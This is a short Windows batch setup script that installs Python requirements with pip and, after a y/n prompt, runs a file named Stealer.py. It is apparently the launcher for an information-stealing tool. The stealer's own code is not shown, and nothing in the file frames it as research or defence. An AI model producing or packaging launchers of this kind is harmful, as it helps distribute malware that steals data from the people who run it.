@echo off
echo Welcome To the setup, press any key to start the setup
echo.
pause

echo Installing requirements.

pip install -r requirements.txt

echo Requirements installed.

cls

ECHO.
set choice = 
set /p choice=Do you want to run the script? (y/n)
if '%choice%'=='y' goto Run
if '%choice%'=='n' goto End

:Run
cls
python Stealer.py
exit

:End
cls
exit


